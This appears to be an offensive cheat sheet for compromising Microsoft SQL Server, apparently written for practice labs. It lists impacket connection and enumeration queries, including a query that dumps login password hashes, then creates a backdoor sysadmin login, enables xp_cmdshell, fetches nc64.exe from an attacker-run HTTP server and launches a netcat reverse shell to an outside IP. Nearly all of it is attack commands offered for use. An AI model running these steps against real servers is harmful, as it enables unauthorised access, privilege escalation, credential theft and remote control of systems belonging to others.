```python
python /usr/share/doc/python3-impacket/examples/mssqlclient.py <USER>@<IP> -windows-auth
```

### Get version
```mssql
select @@version;
```
### Get user
```mssql
select user_name();
```
### Get databases
```mssql
SELECT name FROM master.dbo.sysdatabases;
```
### Use database
```mssql
USE master
```
### Get table names
```mssql
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
```
### List Linked Servers
```mssql
EXEC sp_linkedservers
```

```
SELECT * FROM sys.servers;
```
### List users
```
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
```
### Create user with sysadmin privs
```
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
```

```
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```

```
EXEC sp_helprotect 'xp_cmdshell'
```
### XP_CMDSHELL
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```

```
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

```
xp_cmdshell "whoami"
```

https://github.com/int0x33/nc.exe/
#### HTTP Server for nc.exe
```
sudo python3 -m http.server 80
```
#### NETCAT
```
sudo nc -lvnp 443
```
#### WGET FILE in MSSQL
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<IP>/nc64.exe -outfile nc64.exe"
```
#### EXECUTE REVERSE SHELL
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443"
```
